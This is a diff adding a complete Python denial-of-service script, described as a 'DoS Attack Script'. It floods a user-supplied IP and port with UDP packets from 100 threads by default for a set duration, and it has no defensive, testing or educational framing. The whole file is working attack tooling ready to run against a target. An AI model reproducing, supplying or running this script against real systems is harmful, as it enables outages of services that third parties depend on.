@@ -1,0 +1,74 @@
+import socket
+import threading
+import argparse
+import time
+
+# DoS attack function
+def dos_attack(target_ip, target_port, packet_size, stop_event):
+    """
+    Perform a DoS attack by sending UDP packets to the target.
+    """
+    # Create a socket connection
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes_to_send = b"A" * packet_size  # Packet data
+
+    # Send packets in a loop until the stop event is set
+    while not stop_event.is_set():
+        try:
+            client.sendto(bytes_to_send, (target_ip, target_port))
+            print(f"Packet sent to {target_ip}:{target_port}")
+        except Exception as e:
+            print(f"[ERROR] {e}")
+            break
+
+
+def main():
+    # Parse command-line arguments
+    parser = argparse.ArgumentParser(description="DoS Attack Script")
+    parser.add_argument("--ip", type=str, required=True, help="Target IP address")
+    parser.add_argument("--port", type=int, required=True, help="Target port")
+    parser.add_argument("--packet-size", type=int, default=3072, help="Size of each packet in bytes (default: 3072)")
+    parser.add_argument("--threads", type=int, default=100, help="Number of attack threads (default: 100)")
+    parser.add_argument("--duration", type=int, default=30, help="Duration of the attack in seconds (default: 30)")
+
+    args = parser.parse_args()
+
+    # Extract arguments
+    target_ip = args.ip
+    target_port = args.port
+    packet_size = args.packet_size
+    num_threads = args.threads
+    attack_duration = args.duration
+
+    print(f"[INFO] Starting DoS attack on {target_ip}:{target_port}")
+    print(f"[INFO] Packet size: {packet_size} bytes, Threads: {num_threads}, Duration: {attack_duration} seconds")
+
+    # Create a stop event to control threads
+    stop_event = threading.Event()
+    threads = []
+
+    # Start attack threads
+    for i in range(num_threads):
+        thread = threading.Thread(target=dos_attack, args=(target_ip, target_port, packet_size, stop_event))
+        thread.start()
+        threads.append(thread)
+
+    # Run the attack for the specified duration
+    try:
+        time.sleep(attack_duration)
+    except KeyboardInterrupt:
+        print("[INFO] Attack interrupted by user.")
+    finally:
+        stop_event.set()  # Signal threads to stop
+
+    # Wait for all threads to complete
+    for thread in threads:
+        thread.join()
+
+    print("[INFO] DoS attack finished.")
+
+
+if __name__ == "__main__":
+    main()
+
+
